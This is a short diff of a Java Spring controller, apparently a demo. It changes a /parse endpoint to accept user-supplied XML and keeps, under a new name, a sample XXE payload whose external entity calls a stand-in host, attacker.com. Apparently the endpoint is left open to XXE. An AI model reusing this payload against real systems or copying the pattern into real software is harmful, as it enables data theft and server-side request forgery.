@@ -192,9 +192,9 @@ public class DemoController {
         }
     }
     @GetMapping("/parse")
-    public String parseXml() {
+    public String parseXml(String xmlInput) {
         // Example XML string that could be used to exploit XXE
-        String xmlInput = "<!DOCTYPE root [\n" +
+        String xmlInput1 = "<!DOCTYPE root [\n" +
                 "  <!ENTITY % external SYSTEM \"http://attacker.com\">\n" +
                 "%external;\n" +
                 "]>\n" +
